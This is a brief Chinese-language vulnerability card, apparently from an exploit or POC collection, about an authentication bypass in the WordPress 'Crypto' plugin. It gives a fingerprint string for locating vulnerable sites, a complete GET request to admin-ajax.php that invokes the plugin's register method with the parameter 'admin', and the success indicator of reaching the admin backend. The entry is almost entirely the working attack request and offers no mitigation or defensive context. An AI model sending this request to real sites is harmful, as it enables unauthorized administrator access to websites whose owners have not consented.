# WordPressadmin-ajaxCrypto插件身份认证绕过漏洞

WordPress ｜ 认证/授权绕过 ｜ —
- **指纹**：`"wp-content/plugins/crypto/"`
- **请求**：`GET /wp-admin/admin-ajax.php?action=crypto_connect_ajax_process&method_name=register&param1=admin HTTP/1.1`
- **响应特征**：200 登录后台